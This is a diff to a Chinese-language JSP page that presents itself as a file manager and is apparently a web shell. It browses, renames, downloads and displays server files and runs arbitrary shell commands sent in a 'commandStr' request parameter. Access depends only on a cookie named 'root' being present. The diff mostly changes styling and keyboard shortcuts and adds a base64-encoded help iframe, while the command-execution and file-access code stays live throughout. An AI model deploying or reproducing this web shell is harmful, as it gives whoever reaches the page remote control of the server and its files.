@@ -1,3 +1,4 @@
+<%@page import="java.util.zip.GZIPOutputStream"%>
 <%@page import="java.util.Set"%>
 <%@page import="java.util.Map.Entry"%>
 <%@page import="java.util.Iterator"%>
@@ -45,30 +46,47 @@
 <title> </title>
 
 <style type="text/css">
- body{
-	 background-repeat:space;
-	 background-size:100% 1080px;
-	 background-attachment:scroll;
-	 background-color:#FAFAD2;
-	 color:black;
-	 font:18px red 微软雅黑
- }
  *{position:relative;}
+ body{
+	 color:black;
+	 font:18px red 微软雅黑;
+	 background-color:#FAFAD2;
+	 background-repeat:space;
+	 background-size:100% 1920px;
+	 background-attachment:scroll;
+ }
+ table{
+     width:80%;
+	 margin-top:0;
+	 cellspacing:0;
+	 cellpadding:0;
+	 margin-left:10%;
+	 margin-right:10%;
+	 border-spacing:0;
+	 border:1px #B0C4DE solid;
+ }
+ td{
+ 	height:21px;
+ 	color:black;
+ 	text-align:left;
+ 	padding-left:20px;
+ 	border:1px #B0C4DE solid;
+ }
  a:active{color:yellow}
  a:link:hover{color:red}
  a:visited{color:black}
  a:link{color:black; text-decoration:none}
  h3{margin-left:39%; top: 50px;}
  tr:hover{background-color: red}
- td{text-align:left;padding-left:20px;border:1px #B0C4DE solid;height:21px;color:black}
- table{cellspacing:0;cellpadding:0;border-spacing:0;border:1px #B0C4DE solid;width:80%;margin-left:10%;margin-right:10%;margin-top:0}
+
+
  textarea[rows='30']{position:relative ;top:26px;left: 10% ;width:79.5%;}
  .list{position:relative;top:0}
  .filelist{position:absolute;top:-1px}
  .img{position: relative;top:26px;left:10%;}
  .login{position: relative;margin-left: 38%; margin-top: 10%;}
  .login>input[type='submit']{position: relative;left: 13%;top:20px }
- #CommandDiv{width:80%;margin-left:10%;margin-right:10%;margin-top:0;display:none;}
+ #helpDiv,#CommandDiv{width:80%;margin-left:10%;margin-right:10%;margin-top:0;display:none;}
  #CommandDiv>textarea{width: 100%}  
  /*  #file{color:yellow;background-color:red;} */
 /*  #folder{color:red;background-color:yellow} */
@@ -83,21 +101,32 @@
 		var inhtml= '<form method="post"><input type="hidden" name="oldName" value="'+showoldname+'"><input size="30" type="text" name="newName" value='+showoldname+'><input type="submit" value="保存"></form>'
 		namecol.innerHTML=inhtml;
 	}
-	
-	function switchDiv() {
+	function switchDiv(KeyCode) {
 		var inx=$("#CommandDiv").children("input").get(0);
 		var fileList=$(".fileListTable");
-		var Command=$("#CommandDiv")
-		if(fileList.css('display') == "block"){
-			fileList.css('display','none'); 
-			fileList.css('visibility','hidden');
-			Command.css('display','block');
-			inx.value="";
-		 	inx.focus();
-		}else{
-			Command.css('display','none');
-			fileList.css('display','block');
-			fileList.css('visibility','visible');
+		var Command=$("#CommandDiv");
+		var help=$("#helpDiv");
+		if (KeyCode==88) {
+			if(	help.css("display") == "none"){
+				help.css("display","block");
+				Command.css('display','none');
+				fileList.css('display','none'); 
+			}else{
+				help.css("display","none");
+				fileList.css('display','block');
+			}
+		} else {
+			if(fileList.css('display') == "block"){
+				help.css("display","none");
+				Command.css('display','block');
+				fileList.css('display','none'); 
+				inx.value="";
+			 	inx.focus();
+			}else{
+				help.css("display","none");
+				Command.css('display','none');
+				fileList.css('display','block');
+			}
 		}
 	}
 	function sendCommand(inx){
@@ -106,14 +135,12 @@
 			 $(inx).next().next().html(cmdOut); 
 			 if(eval(cmdOut.substring(0,7)=='Refresh')){
 				 location.reload();
-				 switchDiv();
 			 }
 		},"html");
 		inx.value="";
 		inx.focus();
 	}
 	window.onload=function(){
-		
 		 $("tr:even").css('background-color','#FDF5E6');	 
 		 $("tr:odd").css('background-color','#FAFAD2');
 		 switchDiv();
@@ -123,37 +150,40 @@
 		 var to = $(".root").children("table").find("a");
 		 function keyDown(e) {
 			var keyCode = e.which||e.keyCode;
-		    if(eval(keyCode==13)){
+		    if(keyCode==13){
 		    	 $("div").children("input")[1].click();
-		    }else if(keyCode==102)  {
+		    } else if(e.shiftKey && keyCode == 88)  {
+		    	 switchDiv(keyCode);
+			} else if(keyCode==102||e.shiftKey && keyCode == 65)  {
 		         index++;
-		         if(index==3){ 
+		         if(index==3||keyCode==65){ 
 		        	 index=0;
-		        	 switchDiv(); 
+		        	 switchDiv();
 		         }
-			}else if(e.shiftKey && keyCode == 67){//C
+			} else if(e.shiftKey && keyCode == 67 && to.get(4)!=undefined){//C
 			 	 location.replace(to.get(0));
 			  	 msgDiv.innerHTML="跳转到C:";
-			} else if(e.shiftKey && keyCode == 68){//D
+			} else if(e.shiftKey && keyCode == 68 && to.get(4)!=undefined){//D
 			  	 location.replace(to.get(1));
 			 	 msgDiv.innerHTML="跳转到D:";
-			} else if(e.shiftKey && keyCode == 69){//E
+			} else if(e.shiftKey && keyCode == 69 && to.get(4)!=undefined){//E
 			  	 location.replace(to.get(2));
 			 	 msgDiv.innerHTML="跳转到E:";
-			} else if(e.shiftKey && keyCode == 70){//F
+			} else if(e.shiftKey && keyCode == 70 && to.get(4)!=undefined){//F
 			 	 location.replace(to.get(3));
 			 	 msgDiv.innerHTML="跳转到F:";
-			} else if(e.shiftKey && keyCode == 71){//G
+			} else if(e.shiftKey && keyCode == 71 && to.get(4)!=undefined){//G
 				 location.replace(to.get(4));
 				 msgDiv.innerHTML="跳转到G:";
-			} else if(e.shiftKey && keyCode == 72){//H
+			} else if(e.shiftKey && keyCode == 72 && to.get(5)!=undefined){//H
 				 location.replace(to.get(5));
 				 msgDiv.innerHTML="跳转到H:";
-			} else if(e.shiftKey && keyCode == 73){//I
+			} else if(e.shiftKey && keyCode == 73 && to.get(6)!=undefined){//I
 				 location.replace(to.get(6));
 				 msgDiv.innerHTML="跳转到I:";
-			} else if(e.shiftKey && keyCode == 74){//J
-				 location.replace(to.get( 7));
+			} else if(e.shiftKey && keyCode == 74 && to.get(7)!=undefined){//J
+				 alert(to.get(7))
+				 location.replace(to.get(7));
 				 msgDiv.innerHTML="跳转到J:";
 			}
 		} 
@@ -162,9 +192,6 @@
 </script>
 </head>
 <body>
-
-
-
 <%
 request.getCookies();
 request.setCharacterEncoding ("utf-8");
@@ -172,18 +199,15 @@ response.setCharacterEncoding ("utf-8");
 response.setContentType("text/html;charset=utf-8");
 req=request;
 res=response;
-
 o =res.getWriter();
 url=request.getRequestURI().split("/")[2];
 action=request.getParameter("action");
 oldname=request.getParameter("oldName");
 newname=request.getParameter("newName");
-
 dir=request.getParameter("dir");
 System.out.println((String)application.getAttribute("dir"));
 msg=dir=dir==null?(String)application.getAttribute("dir"):decode(dir);
 if(dir!=null){application.setAttribute("dir", decode(dir));}else{dir="C:\\";}
-
 action=action==null?"list":action;
 HashMap<String, String> user = new HashMap<>();
 String cmdStr=request.getParameter("commandStr");
@@ -204,7 +228,7 @@ if(newname!=null){
 				//o.append(co.getName() + co.getValue());
 				red = co.getName().equals("root");
 				if (red) {// 如果找到指定Cookie
-					System.err.println("Cookie验证通过！当前用户："+co.getValue()+"\t身份确认");	
+					//System.err.println("Cookie验证通过！当前用户："+co.getValue()+"\t身份确认");	
 			     break;
 				}
 			}
@@ -433,7 +457,7 @@ if(newname!=null){
 		    }
 		    return msg;
 	    }
-	    static void fileDownload(String filePath,boolean isOnLine){
+	    static void fileDownload(String filePath,boolean isOnLine){//下载文件
 			File f = new File(filePath);
 			 try{
 				BufferedInputStream br = new BufferedInputStream(new FileInputStream(f));
@@ -458,7 +482,7 @@ if(newname!=null){
 				out.close();
 			 }catch(Exception e){}
 	    }
-	    static String command(String x,String dirs){
+	    static String command(String x,String dirs){//执行控制台命令
 			 String Res="";
 			 try{
 				 x = x == null ? "ver" : x;
@@ -477,7 +501,7 @@ if(newname!=null){
 			 }
 			 return Res;
 		 }
-	    static String fileType(String fileName) {
+	    static String fileType(String fileName) {//判断文件类型
 		String fileType = fileName.substring(fileName.lastIndexOf(".") + 1, fileName.length()).toLowerCase();
 		String img[] = { "bmp", "jpg", "jpeg", "png", "tiff", "gif", "pcx", "tga", "exif", "fpx", "svg", "psd", "cdr",
 			"pcd", "dxf", "ufo", "eps", "ai", "raw", "wmf" };
@@ -486,7 +510,7 @@ if(newname!=null){
 			return "图片";
 		    }
 		}
-		String document[] = { "conf","java","css","js","txt", "bat", "vbs", "py", "htm", "html", "jsp", "sh", "ini", "config", "info","xml","sql"};
+		String document[] = {"lrc", "conf","java","css","js","txt", "bat", "vbs", "py", "htm", "html", "jsp", "sh", "ini", "config", "info","xml","sql"};
 		for (int i = 0; i < document.length; i++) {
 		    if (document[i].equals(fileType)) {
 			return "文档";
@@ -506,7 +530,7 @@ if(newname!=null){
 		    }
 		}
 		return "其他";
-	    }
+	    }  
 	 %>
 	<div class="title" align="center">
 		<h1><a href="<%=url%>">文件管理</a></h1>
@@ -591,7 +615,7 @@ if(newname!=null){
 		    String type=fileType(dir );
 		    System.out.println(type);
 		     if(type.equals("文档")){//在线浏览文档
-		    	 out.println("</table></div><textarea rows=30>"+new String(Files.readAllBytes(Paths.get(dir)) ,"utf-8")+"</textarea>");
+		    	 out.println("</table></div><textarea rows=30>"+ new String(Files.readAllBytes(Paths.get(dir)) ,"utf-8")  +"</textarea>");
 			}else if(type.equals("图片")){//在线浏览图片
 			     String imgurl="data:image/png;base64,"+encoder.encodeToString(Files.readAllBytes(Paths.get(dir))); 
 			     out.println("</table></div><img class='img' src='"+imgurl+"'/>"); 
@@ -603,19 +627,23 @@ if(newname!=null){
 		}
 	}
  }
-  
-	if(cmdStr!=null){
+if(cmdStr!=null){
 		System.out.println("执行命令"+cmdStr);
 		if(cmdStr.startsWith("cd")){
 			dir=cmdStr.startsWith("cd")?cmdStr.substring(3):dir;
 			System.out.println("切换目录"+dir);
 			application.setAttribute("dir", dir);
-			 out.println("cmdStrStartRefresh"+msg+" cmdStrStart");
+			out.println("cmdStrStartRefresh"+msg+" cmdStrStart");
 		}
 		out.println("cmdStrStart"+command(cmdStr,(String)application.getAttribute("dir"))+"cmdStrStart");
 	}
  %>
    </table></div> 
 <div id="CommandDiv"><input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
-</div></body>
+</div>
+<div id="helpDiv" >
+<iframe src="data:text/html;charset=utf-8;base64,PHVsPjxsaT5zaGlmdCtDL0QvRS9GL0cvSCDot7PliLDlr7nlupTnm5jnrKYgPC9saT48bGk+c2hpZnQrQS82NjYg5YiH5o2i5paH5Lu25YiX6KGo5LiO5o6n5Yi25Y+wIDwvbGk+PGxpPnNoaXRmK1gg5biu5YqpPC9saT48L3VsPg==" frameborder="0"></iframe>
+
+ </div>							  
+</body>
 </html>
